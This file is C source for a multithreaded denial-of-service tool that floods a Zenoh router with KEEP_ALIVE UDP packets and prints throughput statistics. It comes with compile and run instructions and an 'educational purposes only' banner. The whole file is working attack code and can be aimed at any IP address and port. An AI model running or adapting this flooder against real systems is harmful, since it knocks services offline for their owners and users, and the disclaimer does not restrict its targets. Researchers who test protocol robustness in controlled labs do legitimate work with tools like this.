/*
 * Attack 1: DoS - KEEP_ALIVE Flood
 * Floods router with KEEP_ALIVE messages
 * 
 * Compile: gcc -o attack1_keepalive attack_1_dos_keepalive.c -pthread
 * Run: ./attack1_keepalive <target_ip> <target_port> <threads>
 * Example: ./attack1_keepalive 127.0.0.1 7447 10
 * 
 * WARNING: FOR EDUCATIONAL PURPOSES ONLY
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>

#define Z_MSG_KEEP_ALIVE 0x02
#define BURST_SIZE 100

static volatile int g_running = 1;
static atomic_ullong g_packets_sent = 0;
static atomic_ullong g_bytes_sent = 0;

typedef struct {
    char *target_ip;
    int target_port;
    int thread_id;
} thread_args_t;

void signal_handler(int sig) {
    printf("\n[!] Caught signal %d, stopping attack...\n", sig);
    g_running = 0;
}

void* attack_thread(void *arg) {
    thread_args_t *args = (thread_args_t*)arg;
    int sock;
    struct sockaddr_in target_addr;
    unsigned char packet[1] = {Z_MSG_KEEP_ALIVE};
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        fprintf(stderr, "[-] Thread %d: Socket creation failed: %s\n", 
                args->thread_id, strerror(errno));
        free(args);
        return NULL;
    }
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);
    
    printf("[+] Thread %d started\n", args->thread_id);
    
    unsigned long local_count = 0;
    
    while (g_running) {
        for (int i = 0; i < BURST_SIZE; i++) {
            ssize_t sent = sendto(sock, packet, sizeof(packet), 0,
                                 (struct sockaddr*)&target_addr,
                                 sizeof(target_addr));
            if (sent > 0) {
                atomic_fetch_add(&g_packets_sent, 1);
                atomic_fetch_add(&g_bytes_sent, sent);
                local_count++;
            }
        }
        usleep(1000);
    }
    
    close(sock);
    printf("[*] Thread %d stopped (sent %lu packets)\n", args->thread_id, local_count);
    free(args);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <threads>\n", argv[0]);
        fprintf(stderr, "Example: %s 127.0.0.1 7447 10\n", argv[0]);
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    
    if (num_threads < 1 || num_threads > 100) {
        fprintf(stderr, "[-] Threads must be between 1 and 100\n");
        return 1;
    }
    
    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh KEEP_ALIVE Flood Attack           ║\n");
    printf("║   WARNING: EDUCATIONAL PURPOSES ONLY       ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Threads: %d\n", num_threads);
    printf("[*] Starting in 3 seconds...\n\n");
    
    sleep(3);
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    pthread_t threads[num_threads];
    time_t start_time = time(NULL);
    
    for (int i = 0; i < num_threads; i++) {
        thread_args_t *args = malloc(sizeof(thread_args_t));
        args->target_ip = target_ip;
        args->target_port = target_port;
        args->thread_id = i;
        pthread_create(&threads[i], NULL, attack_thread, args);
    }
    
    printf("[+] Attack started!\n\n");
    
    while (g_running) {
        sleep(5);
        unsigned long long packets = atomic_load(&g_packets_sent);
        unsigned long long bytes = atomic_load(&g_bytes_sent);
        time_t elapsed = time(NULL) - start_time;
        
        printf("[*] Packets: %llu | Bytes: %llu | Rate: %.2f pps | %.2f KB/s\n",
               packets, bytes,
               elapsed > 0 ? (double)packets / elapsed : 0.0,
               elapsed > 0 ? (double)bytes / elapsed / 1024.0 : 0.0);
    }
    
    printf("\n[*] Waiting for threads to stop...\n");
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    unsigned long long total_packets = atomic_load(&g_packets_sent);
    unsigned long long total_bytes = atomic_load(&g_bytes_sent);
    time_t total_time = time(NULL) - start_time;
    
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║          Final Statistics                  ║\n");
    printf("╠════════════════════════════════════════════╣\n");
    printf("║ Total Packets: %-27llu ║\n", total_packets);
    printf("║ Total Bytes:   %-27llu ║\n", total_bytes);
    printf("║ Duration:      %-27ld ║\n", total_time);
    if (total_time > 0) {
        printf("║ Avg Rate:      %-23.2f pps ║\n", (double)total_packets / total_time);
    }
    printf("╚════════════════════════════════════════════╝\n");
    
    return 0;
}